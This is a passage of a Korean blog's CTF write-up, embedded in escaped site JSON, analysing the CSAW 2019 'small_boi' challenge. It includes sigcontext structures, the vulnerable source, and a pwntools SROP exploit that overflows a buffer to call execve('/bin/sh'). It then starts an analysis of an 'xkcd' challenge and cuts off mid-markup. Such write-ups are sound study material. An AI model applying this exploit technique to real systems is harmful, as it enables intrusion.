punctuation\">(</span>fs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>es<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>ds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span> <span class=\"token comment\">/* CONFIG_X86_32 */</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>di<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>si<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>sp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>dx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>cx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ax<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_64</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r11<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">COPY</code>, <code class=\"language-text\">COPY_SEG</code> 매크로를 사용하여 레지스터및 세그먼트를 복원한다.</li>\n</ul>\n<h2 id=\"sigcontext-32bit\" style=\"position:relative;\"><a href=\"#sigcontext-32bit\" aria-label=\"sigcontext 32bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-32bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">,</span> gsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">,</span> fsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> es<span class=\"token punctuation\">,</span> esh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ds<span class=\"token punctuation\">,</span> dsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ecx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eax<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> trapno<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> err<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eip<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">,</span> __csh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp_at_signal<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ss<span class=\"token punctuation\">,</span> __ssh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> oldmask<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> cr2<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"sigcontext-64bit\" style=\"position:relative;\"><a href=\"#sigcontext-64bit\" aria-label=\"sigcontext 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-64bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  __uint64_t r8<span class=\"token punctuation\">;</span>\n  __uint64_t r9<span class=\"token punctuation\">;</span>\n  __uint64_t r10<span class=\"token punctuation\">;</span>\n  __uint64_t r11<span class=\"token punctuation\">;</span>\n  __uint64_t r12<span class=\"token punctuation\">;</span>\n  __uint64_t r13<span class=\"token punctuation\">;</span>\n  __uint64_t r14<span class=\"token punctuation\">;</span>\n  __uint64_t r15<span class=\"token punctuation\">;</span>\n  __uint64_t rdi<span class=\"token punctuation\">;</span>\n  __uint64_t rsi<span class=\"token punctuation\">;</span>\n  __uint64_t rbp<span class=\"token punctuation\">;</span>\n  __uint64_t rbx<span class=\"token punctuation\">;</span>\n  __uint64_t rdx<span class=\"token punctuation\">;</span>\n  __uint64_t rax<span class=\"token punctuation\">;</span>\n  __uint64_t rcx<span class=\"token punctuation\">;</span>\n  __uint64_t rsp<span class=\"token punctuation\">;</span>\n  __uint64_t rip<span class=\"token punctuation\">;</span>\n  __uint64_t eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> pad0<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">uint64_t</span> err<span class=\"token punctuation\">;</span>\n  __uint64_t trapno<span class=\"token punctuation\">;</span>\n  __uint64_t oldmask<span class=\"token punctuation\">;</span>\n  __uint64_t cr2<span class=\"token punctuation\">;</span>\n  extension <span class=\"token keyword\">union</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n      __uint64_t __fpstate_word<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  __uint64_t __reserved1 <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>해당 <code class=\"language-text\">sigcontext</code> 구조체를 바탕으로 SROP 기법으 이용하여 공격을 진행할 수 있다.</li>\n</ul>\n<h2 id=\"문제-small_boic\" style=\"position:relative;\"><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\" aria-label=\"문제 small_boic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>문제 small_boi.c</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token comment\">/* I wonder what you have to do with this sigreturn gadget */</span>\n<span class=\"token keyword\">volatile</span> <span class=\"token keyword\">void</span> <span class=\"token function\">one_true_gadget</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov $0xf, %eax;\"</span> <span class=\"token comment\">// sigreturn</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"poprax:\"</span>\n    <span class=\"token string\">\"pop %rax;\"</span>\n    <span class=\"token string\">\"ret;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>useful_string <span class=\"token operator\">=</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> useful_byte <span class=\"token operator\">=</span> <span class=\"token char\">'i'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov %0, %%rsi;\"</span>\n        <span class=\"token operator\">:</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"%rsi\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rax, %rax;\"</span>\n        <span class=\"token string\">\"xor %rdi, %rdi;\"</span>\n        <span class=\"token string\">\"mov $0x200, %rdx;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rdi, %rax;\"</span>\n        <span class=\"token string\">\"mov $60, %rax;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>문제 바이너리를 분석해 보면 <code class=\"language-text\">sigreturn</code> , <code class=\"language-text\">/bin/sh</code>, <code class=\"language-text\">syscall</code> 등 익스를 하기에 필요한 명령들이 있는 것을 확인할 수 있으며</li>\n<li>카니리 보호 기법이 걸려 있지 않아 버퍼 오버플로우를 발생시켜 return 주소를 sigreturn call 하여 SROP를 할 수 있다.</li>\n<li>main 함수에서 read 함수를 바탕으로 0x200 바이트를 입력 받기 때문에 버퍼 오버플로우가 발생한다.</li>\n</ul>\n<h2 id=\"srop\" style=\"position:relative;\"><a href=\"#srop\" aria-label=\"srop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SROP</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">binshell <span class=\"token operator\">=</span> <span class=\"token number\">0x4001ca</span>\nsi_return <span class=\"token operator\">=</span> <span class=\"token number\">0x400180</span>\nsyscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400185</span>\n\nframe <span class=\"token operator\">=</span> <span class=\"token function\">SigreturnFrame</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve\nframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binshell\nframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall\n\npayload <span class=\"token operator\">=</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">40</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>si_return<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span>\n<span class=\"token function\">sl</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n<span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>SROP를 하기 위해서는 구조체의 값을 일일이 다 맞쳐서 짜야 한다는 점이 있지만 pwntools의 도구를 사용하여 손 쉽게 해당 레지스터에 필요한 값을 줄 수 가 있다.</li>\n<li>우리는 execve 시스템 콜을 사용하여 /bin/sh 주소를 인자로 사용하여 쉘을 획득하면 된다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAACFElEQVQoz22O2W7bQAxF/SGJ1uEMOatGSyQrWmxLsWU3W5M+9qlA//8XCiVIghYFDi4Igge8m7umXealn5fhcB7mS1a1pmiy6tYUW503ru5908u8CYQJQYaMQkYBwwhkBLgxyl3un7bjHKmWZftYNQHVgewCrEKqQTUMnMCSqOLSx0KH3CXkGblEqA03/vL8uu12BkyO3qDNMCsp15gpWd46XwN2HDsQlnSCNhaO61KQTVdZueXxe9vv6gR6wJJhAziCcCAl+lr7Aqjh1ABZNKlQibCgcv4ug3S7u8XXrZW2BLJAHqhaB+lAFVxahjlQDqTJpGhibhK08C6jyX/++n28POwB74UauZyEfODYKF+69mzzHdDC5ZnTjXYMDaOc3FYqz0mvtS9PL/XtWMRQM8xSUaRiy9BzckzIVAgguYKImnGV8vV/wmUMtNFVtzy9Doc7pVye11l+kxeNlDZJRcTwmmHwltcMI04RUMhkzGXIRMhwcyrqKqtkVmlf2bKJgCKQAcOrhF8nPFgTPgYepKsTMAzf2OyV+zYt3bzU3diOU7XttS/ReKEzrpzQmXSFzAquHVeOSxt+mKs8tsP948vl+cc4n7r9cXd3HuelHaem32/7/TCdhunUHY5VO5DNhc7+ks9ZeRyn8Xhpx0N+04apuIrhq2EqPvlcfsm1tIdhOpwfxvk0zudhOhVNx8j8c/df/gAGdY0uSXZxhQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png\"\n        srcset=\"/static/74e85d1e0257e52b19b4afbfd362849d/e9ff0/0.png 180w,\n/static/74e85d1e0257e52b19b4afbfd362849d/f21e7/0.png 360w,\n/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png 720w,\n/static/74e85d1e0257e52b19b4afbfd362849d/7e509/0.png 745w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#restore_sigcontext\">restore_sigcontext</a></li>\n<li><a href=\"#sigcontext-32bit\">sigcontext-32bit</a></li>\n<li><a href=\"#sigcontext-64bit\">sigcontext-64bit</a></li>\n<li><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\">문제 small_boi.c</a></li>\n<li><a href=\"#srop\">SROP</a></li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 small_boi 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍗"},"fields":{"slug":"/csaw_small_boi_ctf_writeup/"}},"prev":{"id":"4f92bcc5-6f91-5e27-8ff5-b9b3879be3ae","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAlElEQVQI1z3I4Q6CIBRAYV8ES0i5iAKyZXpVxHSzzPUGvf9rNHJrOz++nWheP8N9R783buv8juOrddutf7TuqazLNea6EyVK0wcoFApL66BohMYIx7ebl8kvy7ziONmmU7aG0ghV8ULTTCQZJCkkAeIcAGH+TqSsr66tlrI2RqaCME4oJzQjlMeMxwxOF4gZHDj6zy9QXiFQXvghXAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/284023c502fc60db87e32cf7d9b3a3b3/37523/0.png\"\n        srcset=\"/static/284023c502fc60db87e32cf7d9b3a3b3/e9ff0/0.png 180w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/f21e7/0.png 360w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/37523/0.png 720w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/218a4/0.png 1052w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>기타 정보</p>\n<ul>\n<li>statically linked, 64 bit</li>\n<li>Heartbeat packet</li>\n</ul>\n<h2 id=\"보호기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"보호기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호기법</h2>\n<ul>\n<li>No RELRO</li>\n<li>No Canary found</li>\n<li>NX enabled</li>\n<li>No PIE</li>\n</ul>\n<h2 id=\"바이너리-분석\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"바이너리 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 분석</h2>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">root@e5e68faa5052<span class=\"token operator\">:</span><span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>Zer0Luck<span class=\"token operator\">/</span>challenges<span class=\"token operator\">/</span>xkcd# <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>xkcd \nCould not open the flag<span class=\"token punctuation\">.</span>\n\n<span class=\"token operator\">-></span> 현재 디렉토리에 flag 파일을 생성한 후에 분석을 시도하자</code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 468px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 126.11111111111113%; position: relative; bottom: 0; left: 0; background-image: 